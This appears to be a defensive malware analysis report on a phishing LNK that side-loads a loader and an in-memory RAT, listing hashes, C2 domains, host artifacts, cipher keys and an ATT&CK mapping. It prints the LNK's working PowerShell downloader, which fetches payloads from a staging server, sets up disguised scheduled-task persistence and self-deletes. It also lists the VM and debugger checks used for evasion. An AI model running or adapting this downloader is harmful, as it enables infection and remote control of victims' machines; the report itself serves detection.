
### File Hashes (SHA-256)

| SHA-256 | Size (bytes) | File | Role |
|---|---|---|---|
| `a8ecbd9c049044ca4990a0e5960d19ce782a3b42d7763e9693d7c91ead24a0b7` | 4,042 | `GRES3001.lnk` | **Initial-access shortcut** (conhost→PowerShell downloader) |
| `56d656d684077e7b3231393f5464447cdc8eea81b6415c5f010bc52f0c8cb317` | 1,049,410 | `GRES3001.pdf` | Decoy lure document |
| `8084059287c11eeb3088d3b0d73801c180f5df3abc840c4d829351ae193ed32e` | 1,042,792 | `_gresstrip0.jpg` | Decoy image carved from the PDF |
| `b58351ead08db413ca499cfeb1b1091ed8bfd68f4089605e452fa01ed46f42b1` | 107,008 | `Fondue.exe` | Legitimate MS sideload host |
| `914da75a4ad6d70db856a2bc318d8828f28894622f017ee78d470b4794faafa6` | 15,360 | `APPWIZ.cpl` | **Malicious** side-loaded loader DLL (export `RunFODW`) |
| `718812adb0d669eea9606432202371e358c7de6cdeafeddad222c36ae0d3f263` | 449,640 | `msvcp140.dll` | Bundled VC++ runtime (appears legitimate — verify vs known-good) |
| `09d1e604e8cdd06176fcc3d3698861be20638a4391f9f2d9e23f868c1576ca94` | 90,216 | `vcruntime140.dll` | Bundled VC++ runtime (appears legitimate — verify vs known-good) |
| `a5e448af73b0ff6b6fcfe6ef7808120e1fd7e5c4c9b4edd68e1c980e5ea3406b` | 516,204 | `editor.dat` | Base64-wrapped AES-256-CBC RAT container |
| `ecab0e747bff16a1163bbd9bb494e68dd4d7ca655ac7279bd4dd73221f7df57c` | 387,152 | `editor.decrypted.bin` | AES-decrypted Donut loader blob |
| `7099c33933716c00c1f4bdb0281c230b981c76b23d7d1c83abc6f58968267d54` | 355,840 | `editor.extracted.exe` | **Final RAT** (carved in-memory PE) |

### Network

```
chinagreenenergy.org                   Staging / delivery server (HTTPS) — LNK downloader
gcl-power.org                          C2 hostname (HTTPS/443)\
gcl-cn.org                             Can be related by BANNER_0_HASH-HOST=1afcf060c85a431a22adb4f2e3154c2b
/prjozifvkpkfhkr/                      C2 URI — registration/check-in 
/prjozifvkpkfhkr/gedhagammgjvvva/      C2 URI — command poll 
/prjozifvkpkfhkr/spxbjdhxtapivrk/      C2 URI — screenshot exfil 
api.ipify.org                          Public-IP recon (self-geo)
ip2c.org                               Geolocation/ASN recon (self-geo)
172.67.210.10                          Cloudflare  IP that gcl-power.org resolved to during analysis
RRn926EmIRfm9IlJyP1yVO2
Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/123.0.0.0
```

Powershell embeded in LNK  (`GRES3001.lnk`)

```powershell
$ProgressPreference='SilentlyContinue'; $b='C:\Users'; $c='C:\Windows'
# decoy + payloads from the staging server (junk extensions on the wire, renamed after download):
iwr https://chinagreenenergy.org/doc/35566/SXxls -OutFile $b\Public\GRES3001.pdf -UseB ; ii $b\Public\GRES3001.pdf
iwr https://chinagreenenergy.org/doc/list/load-list/dfe87bbc-53e0-489f-a9e6-ab8f4be47cb9 -OutFile $b\Public\Fondue.ezxzez       -UseB ; gci $b\Public\Fondue.ezxzez        | ren -N {$_.Name -replace 'z',''}  # -> Fondue.exe
iwr https://chinagreenenergy.org/doc/list/load-list/8daaa3e4-c85e-40c1-a2a2-94679e94c417 -OutFile $b\Public\APPWIZ.cypyly        -UseB ; gci $b\Public\APPWIZ.cypyly        | ren -N {$_.Name -replace 'y',''}  # -> APPWIZ.cpl
iwr https://chinagreenenergy.org/doc/list/load-list/ecdc6b92-62b5-4acd-99f2-af09902938e1 -OutFile $b\Public\msvcp140.dzlzlz      -UseB ; gci $b\Public\msvcp140.dzlzlz      | ren -N {$_.Name -replace 'z',''}  # -> msvcp140.dll
iwr https://chinagreenenergy.org/doc/list/load-list/e7477b17-45f0-420b-b2b1-811d4c1556ea -OutFile $b\Public\vcruntime140.dzlzlz  -UseB ; gci $b\Public\vcruntime140.dzlzlz  | ren -N {$_.Name -replace 'z',''}  # -> vcruntime140.dll
iwr https://chinagreenenergy.org/doc/list/load-list/000bd4a8-814d-414c-8be8-f0c77a9c7e1e -OutFile $c\Tasks\editor.dat            -UseB
cpi "$b\Public\GRES3001.pdf" -destination .
# persistence (schtasks reached via gcm sch* to dodge the literal string):
&(gcm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$b\Public\Fondue" /f
erase *1.?n?    # self-delete the .lnk (matches GRES3001.lnk)
```


### Environment Detection

- **Debuggers / analysis tools:** `ollydbg`, `x32dbg`, `x64dbg`, `windbg`, `ProcessHacker`, `procmon`, `procexp`, `idaq`/`idat`/`idau`/`idaw` (+ `ida64`), `Wireshark`, `dumpcap`, `Fiddler`, `netmon`
- **VM:** VMware (`vmmouse.sys`, `vmhgfs.sys`, `vmwaretray.exe`, `vm3dgl.dll`, `VMwareVMware`), VirtualBox (`VBoxMouse.sys`, `VBoxGuest.sys`, `vboxdisp.dll`, `vboxhook.dll`, `vboxmrxnp.dll`, `vboxservice.exe`, `vboxtray.exe`, `VBoxVBoxVBox`), Xen (`XenVMMXenVMM`), KVM (`KVMKVMKVM`), Hyper-V (`Microsoft Hv`), Qemu/`BOCHS`, `Parallels`
- **Cloud scanner:** AWS, GCP, Azure,Alibaba 

### Scheduled task
scheduled task `GoogleErrorReport`, created via `&(gcm sch*)` (to avoid the literal `schtasks` string) with trigger **every minute**

### Host
```
Mutex:    kshdkfhskdfjkhsdkfhsjkdfhkj
File:     cus.dat  (dropped config)
RegKey:   SOFTWARE\Microsoft\Terp
RegKey:   SOFTWARE\Microsoft\Zero
```

### Crypto

```
# RAT C2 cipher (editor.extracted.exe — beacon/traffic)
Cipher:   Salsa20
Key:      tn9905083tfbsxqrxs7qe4ryw1nif8h1  (32 bytes)
Nonce:    lPvymwIk  (8 bytes)

# Loader cipher (APPWIZ.cpl — decrypts editor.dat -> Donut blob)
Cipher:   AES-256-CBC (Windows CNG / bcrypt.dll)
Key:      1f1e1d1c1b1a101108090a0b0c0d0e0f00020405040102031011121415181611  (32 bytes)
IV:       000803030902060708090a0b0c0d0e0f  (16 bytes)
```

### Strings / Patterns

```
umnome=  pmjodf=  idkdfjej=  vrjdmej=  ndlpeip=  cokenme=  mkeoldkf=
dty=dw   dty=fl   dty=sc     dty=cmx
cmd.exe /c chcp 65001 |
```

#### IOCs from hunt
```
914da75a4ad6d70db856a2bc318d8828f28894622f017ee78d470b4794faafa6
682addb3d1bb93cdf9f0883314ff637d3b71b67b203fc83562ec83f64f249aed
9f28670248698fc426cc82e7fcd22fd8b3904f2092d78bfbc79a887081c87277
fc480faf093dbcef685a3895e1b2aab9425320b9e7113fd65c49b84fb70ccb66
0f692837e80f35bdcbae8e83c53ca116d9569a7d27ecdceabf92cccb67f18b20
0d478e27738c677dce4c75a23de9f30e8fd391cdaf6a94b260e0881bea8a6339

https://zonawood.org/download/fetch/list5/22095/view/c8da6b51-77e2-49c7-8c5d-138e14902851
https://gcl-power-cn.org/doc/27527/e8b3e531-b907-4939-b6e6-b5bdb2351aaa
``` 

#### MITRE ATT&CK Mapping

| Tactic | Technique | Observable in this intrusion |
|---|---|---|
| Initial Access | Phishing (`T1566`) | Assessed delivery of `GRES3001.lnk` |
| Execution | User Execution: Malicious File (`T1204.002`) | Victim opens `GRES3001.lnk` |
| Execution | Command and Scripting Interpreter: PowerShell (`T1059.001`) | LNK launches `conhost.exe` and obfuscated PowerShell downloader |
| Execution | Command and Scripting Interpreter: Windows Command Shell (`T1059.003`) | `cmx` handler runs `cmd.exe /c chcp 65001 \| <cmd>` |
| Execution | Shared Modules (`T1129`) | Runtime linking via `GetProcAddress` |
| Persistence | Scheduled Task/Job: Scheduled Task (`T1053.005`) | `GoogleErrorReport` task runs `Fondue.exe` every minute |
| Defense Evasion | Hijack Execution Flow: DLL Side-Loading (`T1574.002`) | Signed `Fondue.exe` side-loads malicious `APPWIZ.cpl` |
| Defense Evasion | Indirect Command Execution (`T1202`) | `conhost.exe` proxies PowerShell execution |
| Defense Evasion | Masquerading: Match Legitimate Name or Location (`T1036.005`) | `msedge.exe` icon spoof, `GoogleErrorReport` task name, and `C:\Users\Public` staging |
| Defense Evasion | Obfuscated Files or Information (`T1027`) | Custom Base64 and cipher layering |
| Defense Evasion | Indicator Removal from Tools (`T1027.005`) | Stack-string obfuscation |
| Defense Evasion | Encrypted/Encoded File (`T1027.013`) | `editor.dat` is Base64-wrapped AES-256-CBC |
| Defense Evasion | Deobfuscate/Decode Files or Information (`T1140`) | Base64 and Salsa20 decode paths for payloads and C2 traffic |
| Defense Evasion | Reflective Code Loading (`T1620`) | Donut maps final PE in memory without writing it to disk |
| Defense Evasion | Impair Defenses: Disable or Modify Tools (`T1562.001`) | Donut patches in-process AMSI and WLDP before payload execution |
| Defense Evasion | Impair Defenses: Indicator Blocking (`T1562.006`) | Donut patches `EtwEventWrite` to suppress ETW telemetry |
| Defense Evasion | Virtualization/Sandbox Evasion: System Checks (`T1497.001`) | CPUID hypervisor brand checks and VM driver, DLL, and process strings |
| Defense Evasion | Modify Registry (`T1112`) | Writes `SOFTWARE\Microsoft\Terp` and `SOFTWARE\Microsoft\Zero` |
| Discovery | Security Software Discovery (`T1518.001`) | Analysis-tool and AV blacklist scan via `Process32Next` |
| Discovery | Process Discovery (`T1057`) | `Process32First` and `Process32Next` enumeration |
| Discovery | System Information Discovery (`T1082`) | OS `ProductName` and environment strings |
| Discovery | File and Directory Discovery (`T1083`) | `fl` directory-listing handler |
| Discovery | System Location Discovery (`T1614`) | Locale via `GetLocaleInfo` and network geolocation via `ip2c.org` |
| Discovery | System Network Configuration Discovery (`T1016`) | Public IP lookup via `api.ipify.org` |
| Collection | Screen Capture (`T1113`) | `sc` handler captures the virtual screen with `BitBlt` and WIC encoding |
| Collection | Data from Local System (`T1005`) | `uf` file upload and `fl` directory-listing handlers |
| Command and Control | Application Layer Protocol: Web Protocols (`T1071.001`) | HTTPS C2 to `gcl-power.org:443` |
| Command and Control | Encrypted Channel: Symmetric Cryptography (`T1573.001`) | Salsa20 encrypts C2 payloads |
| Command and Control | Data Encoding: Standard Encoding (`T1132.001`) | Custom-alphabet Base64 wrapping |
| Command and Control | Ingress Tool Transfer (`T1105`) | Staging downloads and `dw` download-and-execute handler |
| Command and Control | Proxy (`T1090`) | Cloudflare fronts the C2 origin (`172.67.210.10`) |
| Exfiltration | Exfiltration Over C2 Channel (`T1041`) | Host fingerprint, screenshots, and files sent over the beacon |
